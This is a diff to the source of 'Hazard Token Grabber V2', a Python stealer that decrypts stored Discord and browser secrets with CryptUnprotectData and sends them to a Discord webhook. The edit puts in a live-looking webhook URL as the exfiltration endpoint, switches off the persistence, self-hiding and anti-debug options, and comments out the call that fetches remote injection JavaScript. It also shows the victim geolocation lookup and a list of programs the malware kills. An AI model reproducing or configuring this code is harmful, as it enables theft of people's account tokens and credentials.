@@ -21,17 +21,17 @@ from win32crypt import CryptUnprotectData
 
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/975834651778244768/cRLpRsx74fliZAK-i6wqWvhEsPRo4H8cYfKLQZQEscqMoHyoPBKzMHQ9JQOBFIBpijU2",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': True,
+    'kill_processes': False,
     # if you want the file to run at startup
-    'startup': True,
+    'startup': False,
     # if you want the file to hide itself after run
-    'hide_self': True,
+    'hide_self': False,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
-    'anti_debug': True,
+    'anti_debug': False,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
@@ -178,7 +178,7 @@ class Hazard_Token_Grabber_V2(functions):
             except RuntimeError:
                 continue
         self.neatifyTokens()
-        await self.injector()
+        # await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
 
@@ -492,7 +492,13 @@ class Hazard_Token_Grabber_V2(functions):
         wkey = w[1].replace(" ", "᠎ ")
         ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
         disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
-        ip, city, country, region, org, loc, googlemap = "N/A"
+        ip = "N/A"
+        city = "N/A"
+        country = "N/A"
+        region = "N/A"
+        org = "N/A"
+        loc = "N/A"
+        googlemap = "N/A"
         data = httpx.get("https://ipinfo.io/json").json()
         ip = data.get('ip')
         city = data.get('city')
